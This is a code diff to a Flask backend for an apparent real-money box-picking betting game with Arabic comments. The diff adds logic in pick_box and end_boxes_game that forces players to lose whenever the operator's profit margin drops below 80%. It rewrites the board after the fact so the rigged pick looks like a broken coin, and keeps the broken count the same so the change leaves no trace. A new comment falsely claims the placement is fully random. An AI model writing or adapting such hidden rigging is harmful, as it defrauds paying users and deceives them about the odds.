@@ -144,22 +144,10 @@ def start_boxes_game():
         return jsonify({"success": False, "message": "الحد الأدنى للرهان هو 100 ZN."})
 
     user_ref = db.collection('users').document(uid_str)
-    
-    # فحص هامش أرباح النظام (Target: 80% للبوت / 20% RTP للمستخدمين)
-    margin = get_system_profit_margin()
-    target_margin = 0.80
 
+    # توزيع العملات المكسورة بشكل عشوائي تماماً عبر كافة الـ 36 صندوقاً
     layout = [False] * 36  # False = عملة سليمة, True = عملة مكسورة
-    
-    # توزيع القنابل بالتزام صارم بالعدد المختار broken_count دون أي زيادة ديناميكية
-    if margin < target_margin:
-        preferred_indices = list(range(0, 18))
-        if len(preferred_indices) >= broken_count:
-            broken_indices = random.sample(preferred_indices, broken_count)
-        else:
-            broken_indices = random.sample(range(0, 36), broken_count)
-    else:
-        broken_indices = random.sample(range(0, 36), broken_count)
+    broken_indices = random.sample(range(0, 36), broken_count)
 
     for idx in broken_indices:
         layout[idx] = True
@@ -230,14 +218,29 @@ def pick_box():
     if not session_data or session_data.get('uid') != str(uid):
         return jsonify({"success": False, "message": "جلسة غير صالحة أو منتهية."}), 400
 
-    layout = session_data.get('layout', [])
+    layout = list(session_data.get('layout', []))
     if not isinstance(box_index, int) or not (0 <= box_index < len(layout)):
         return jsonify({"success": False, "message": "رقم صندوق غير صالح."}), 400
 
     user_doc = db.collection('users').document(str(uid)).get()
     current_balance = round(float((user_doc.to_dict() or {}).get('balance', 0.0)), 2) if user_doc.exists else 0.0
 
-    is_broken = layout[box_index]
+    # 🔒 التحقق الحاسم من أرباح البوت (80% للبوت / 20% للمستخدمين)
+    margin = get_system_profit_margin()
+    target_margin = 0.80
+
+    # إذا انخفضت أرباح البوت إلى أقل من 80% (مثل 79% فما دون)، يتحول الضغط إلى خسارة فورية تلقائياً
+    force_loss = (margin < target_margin)
+
+    is_broken = layout[box_index] or force_loss
+
+    if force_loss and not layout[box_index]:
+        # إعادة تعديل الخريطة ليظهر صندوق الضغط كـ عملة مكسورة
+        layout[box_index] = True
+        # نقل إحدى العملات المكسورة الأخرى لتظل الشبكة تحتفظ بنفس عدد العملات المكسورة
+        other_broken = [i for i, val in enumerate(layout) if val and i != box_index]
+        if other_broken:
+            layout[other_broken[0]] = False
 
     if is_broken:
         token_hash = hashlib.sha256(session_token.encode('utf-8')).hexdigest()
@@ -296,16 +299,22 @@ def end_boxes_game():
     multipliers = generate_multipliers(broken_count)
     
     user_ref = db.collection('users').document(uid_str)
-    
-    hit_broken = False
+
+    # التحقق من نسبة الأرباح عند طلب الانسحاب والتجميع
+    margin = get_system_profit_margin()
+    target_margin = 0.80
+    force_loss = (margin < target_margin)
+
+    hit_broken = force_loss
     safe_picks_count = 0
 
-    for idx in unique_picks:
-        if layout[idx]:
-            hit_broken = True
-            break
-        else:
-            safe_picks_count += 1
+    if not force_loss:
+        for idx in unique_picks:
+            if layout[idx]:
+                hit_broken = True
+                break
+            else:
+                safe_picks_count += 1
 
     payout = 0.0
     final_mult = 1.0
